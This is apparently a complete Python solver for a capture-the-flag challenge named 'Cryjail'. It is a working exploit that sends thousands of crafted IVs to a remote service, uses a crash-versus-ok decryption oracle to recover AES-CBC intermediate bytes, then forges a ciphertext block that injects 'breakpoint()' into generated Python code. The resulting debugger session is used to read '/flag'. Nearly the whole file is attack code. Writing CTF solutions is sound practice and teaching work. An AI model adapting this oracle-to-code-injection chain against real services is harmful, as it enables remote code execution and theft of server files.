#!/usr/bin/env python3
"""Solver for the Cryjail challenge.

Usage: python solve.py HOST PORT
Keep the same connection alive: the service generates a fresh AES key per
process, and the oracle needs roughly 4,100 requests against that one key.
"""

from __future__ import annotations

import argparse
import re
import secrets
import socket
import sys


BLOCK = 16
PROMPT = b"New name (iv:ciphertext, in hex): "
OK = b"[ok] reported name to our database"
CRASH = b"[!] probably not enough cores or something idk lmao"
FLAG_RE = re.compile(rb"[A-Za-z0-9_]+\{[^\r\n}]+\}")


def xor(left: bytes, right: bytes) -> bytes:
    return bytes(a ^ b for a, b in zip(left, right, strict=True))


class Challenge:
    def __init__(self, host: str, port: int, password: str | None = None) -> None:
        self.sock = socket.create_connection((host, port), timeout=20)
        self.sock.settimeout(90)
        self.buffer = b""
        if password:
            self.sock.sendall(password.encode() + b"\n")
        self.recvuntil(PROMPT)

    def recvuntil(self, marker: bytes) -> bytes:
        while marker not in self.buffer:
            chunk = self.sock.recv(65536)
            if not chunk:
                raise ConnectionError(f"connection closed before {marker!r}")
            self.buffer += chunk
        end = self.buffer.index(marker) + len(marker)
        result, self.buffer = self.buffer[:end], self.buffer[end:]
        return result

    @staticmethod
    def wire(iv: bytes, ciphertext: bytes) -> bytes:
        return iv.hex().encode() + b":" + ciphertext.hex().encode() + b"\n"

    def probes(self, ivs: list[bytes], ciphertext: bytes) -> list[bool]:
        """Batch a 256-value scan, then consume one result/prompt per value."""
        self.sock.sendall(b"".join(self.wire(iv, ciphertext) for iv in ivs))
        outcomes = []
        for _ in ivs:
            reply = self.recvuntil(PROMPT)
            if OK in reply:
                outcomes.append(True)
            elif CRASH in reply:
                outcomes.append(False)
            else:
                raise RuntimeError(reply.decode(errors="replace"))
        return outcomes

    def send_final(self, iv: bytes, ciphertext: bytes) -> None:
        self.sock.sendall(self.wire(iv, ciphertext))


def recover_intermediate(challenge: Challenge, ciphertext: bytes) -> bytes:
    """Recover D_K(ciphertext) for one AES block with the quote oracle."""
    if len(ciphertext) != BLOCK:
        raise ValueError("this helper expects one ciphertext block")

    intermediate = bytearray(BLOCK)
    for position in range(BLOCK):
        # Work left-to-right. IV[j] = I[j] makes each known prefix plaintext
        # byte NUL, which escape() renders as the harmless text \\x00.
        for _attempt in range(32):
            base = bytearray(secrets.token_bytes(BLOCK))
            base[:position] = intermediate[:position]
            candidates = []
            for value in range(256):
                iv = base.copy()
                iv[position] = value
                candidates.append(bytes(iv))

            outcomes = challenge.probes(candidates, ciphertext)
            crashed = [value for value, ok in enumerate(outcomes) if not ok]
            if len(crashed) == 1:
                # The sole bad value makes the raw decrypted byte a quote,
                # ending the generated bytes literal.
                intermediate[position] = crashed[0] ^ ord('"')
                break
        else:
            raise RuntimeError(f"no clean source context for byte {position}")

        print(f"[+] recovered {position + 1:02d}/{BLOCK} intermediate bytes", file=sys.stderr)
    return bytes(intermediate)


def validate_intermediate(challenge: Challenge, ciphertext: bytes, intermediate: bytes) -> None:
    """Reject a rare misleading singleton scan before injecting code."""
    quote_ivs = []
    for position in range(BLOCK):
        iv = bytearray(intermediate)
        iv[position] ^= ord('"')
        quote_ivs.append(bytes(iv))
    outcomes = challenge.probes([intermediate] + quote_ivs, ciphertext)
    if not outcomes[0] or any(outcomes[1:]):
        raise RuntimeError("intermediate validation failed; restart the solver")


def solve(host: str, port: int, password: str | None = None) -> bytes:
    challenge = Challenge(host, port, password)
    ciphertext = bytes(BLOCK)  # Its decrypt intermediate value is unknown.
    intermediate = recover_intermediate(challenge, ciphertext)
    validate_intermediate(challenge, ciphertext, intermediate)

    # Closes the bytes literal, starts PDB, and comments out the generated
    # `!", file=devnull)` suffix. This is exactly one AES block.
    payload = b'");breakpoint()#'
    assert len(payload) == BLOCK
    iv = xor(intermediate, payload)
    challenge.send_final(iv, ciphertext)

    # Parent input was deliberately read with os.read(), so it did not buffer
    # the bytes needed by the PDB instance in the forked child.
    pdb_banner = challenge.recvuntil(b"(Pdb) ")
    challenge.sock.sendall(b'!print(open("/flag").read())\n')
    flag_output = challenge.recvuntil(b"(Pdb) ")
    match = FLAG_RE.search(pdb_banner + flag_output)
    if not match:
        raise RuntimeError((pdb_banner + flag_output).decode(errors="replace"))
    challenge.sock.sendall(b"q\n")
    return match.group(0)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("host", help="host from the instantiator")
    parser.add_argument("port", type=int, help="port from the instantiator")
    parser.add_argument("--password", help="optional instance password")
    args = parser.parse_args()
    print(solve(args.host, args.port, args.password).decode())
